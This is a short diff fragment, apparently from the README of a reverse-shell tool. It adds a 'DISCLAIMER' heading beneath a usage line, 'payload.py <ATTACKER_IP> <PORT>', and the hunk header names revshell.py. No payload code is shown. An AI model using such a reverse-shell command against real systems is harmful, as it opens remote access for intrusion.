@@ -22,3 +22,4 @@ python revshell.py
 ```bash
 payload.py <ATTACKER_IP> <PORT>
 ```
+<h2 align="center"> DISCLAIMER </h2>
